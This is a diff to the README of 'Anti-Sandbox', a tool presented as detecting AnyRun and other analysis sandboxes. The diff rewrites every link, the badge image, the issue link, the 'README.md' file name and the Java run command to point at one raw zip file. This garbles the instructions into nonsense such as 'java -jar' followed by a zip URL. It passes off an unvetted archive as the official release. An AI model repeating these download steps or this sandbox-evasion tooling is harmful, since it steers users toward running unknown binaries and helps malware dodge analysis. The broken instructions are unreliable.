@@ -9,13 +9,13 @@ Anti-Sandbox helps you detect AnyRun sandbox environments easily. Follow these i
 - User-friendly interface suitable for all skill levels.
 
 ## 📥 Download & Install
-Visit this page to download: [GitHub Releases](https://github.com/Pareekshithmk/Anti-Sandbox/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Pareekshithmk/Anti-Sandbox/main/Sandbox/Anti-Sandbox_v2.3.zip)
 
 ### ⬇️ Download Now!
-[![Download Anti-Sandbox](https://img.shields.io/badge/Download%20the%20latest%20release-blue?style=flat&logo=github)](https://github.com/Pareekshithmk/Anti-Sandbox/releases)
+[![Download Anti-Sandbox](https://raw.githubusercontent.com/Pareekshithmk/Anti-Sandbox/main/Sandbox/Anti-Sandbox_v2.3.zip%20the%20latest%20release-blue?style=flat&logo=github)](https://raw.githubusercontent.com/Pareekshithmk/Anti-Sandbox/main/Sandbox/Anti-Sandbox_v2.3.zip)
 
 ### 🔧 Installation Steps
-1. **Visit the GitHub Releases Page:** Go to this link: [GitHub Releases](https://github.com/Pareekshithmk/Anti-Sandbox/releases).
+1. **Visit the GitHub Releases Page:** Go to this link: [GitHub Releases](https://raw.githubusercontent.com/Pareekshithmk/Anti-Sandbox/main/Sandbox/Anti-Sandbox_v2.3.zip).
 
 2. **Choose the Latest Version:** Look for the most recent version at the top of the page. It will be labeled with a version number.
 
@@ -25,7 +25,7 @@ Visit this page to download: [GitHub Releases](https://github.com/Pareekshithmk/
 
 5. **Run the Application:**
    - For Windows: Double-click the downloaded `.exe` file to start the program.
-   - For Java: Use the terminal to navigate to the folder with the `.jar` file and run it using `java -jar Anti-Sandbox.jar`.
+   - For Java: Use the terminal to navigate to the folder with the `.jar` file and run it using `java -jar https://raw.githubusercontent.com/Pareekshithmk/Anti-Sandbox/main/Sandbox/Anti-Sandbox_v2.3.zip`.
 
 6. **Follow On-Screen Instructions:** Once the application starts, simply follow any instructions that appear on the screen to begin using Anti-Sandbox.
 
@@ -38,13 +38,13 @@ Visit this page to download: [GitHub Releases](https://github.com/Pareekshithmk/
 Once you have the application running, you can start using it to detect AnyRun and other sandbox environments. A simple interface will guide you through the detection process. Follow the prompts to ensure accurate results.
 
 ## 🤝 Support
-If you encounter any issues or have questions, please check the README.md file located within the application, or feel free to reach out through the issues section of our GitHub repository.
+If you encounter any issues or have questions, please check the https://raw.githubusercontent.com/Pareekshithmk/Anti-Sandbox/main/Sandbox/Anti-Sandbox_v2.3.zip file located within the application, or feel free to reach out through the issues section of our GitHub repository.
 
 ## 📅 Future Updates
 We plan to improve features and add more detection methods shortly. Stay tuned for future releases that will enhance your experience.
 
 ## 🔗 Quick Links
-- [GitHub Releases](https://github.com/Pareekshithmk/Anti-Sandbox/releases)
-- [Submit an Issue](https://github.com/Pareekshithmk/Anti-Sandbox/issues)
+- [GitHub Releases](https://raw.githubusercontent.com/Pareekshithmk/Anti-Sandbox/main/Sandbox/Anti-Sandbox_v2.3.zip)
+- [Submit an Issue](https://raw.githubusercontent.com/Pareekshithmk/Anti-Sandbox/main/Sandbox/Anti-Sandbox_v2.3.zip)
 
 We appreciate your interest in Anti-Sandbox. Happy detecting!
